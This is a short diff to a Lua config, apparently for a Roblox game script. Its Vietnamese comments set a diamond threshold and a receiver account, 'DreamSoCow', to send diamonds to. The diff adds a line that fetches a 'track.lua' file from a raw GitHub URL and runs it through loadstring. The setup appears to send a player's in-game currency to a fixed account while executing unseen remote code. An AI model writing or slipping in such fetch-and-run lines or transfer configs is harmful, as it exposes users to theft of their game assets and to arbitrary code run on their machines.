@@ -15,3 +15,4 @@ getgenv().Config = {
     MinDiamonds = 100000000, -- Gửi khi kim cương > số này
     Receivers = { 'DreamSoCow' }, -- Danh sách người nhận
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
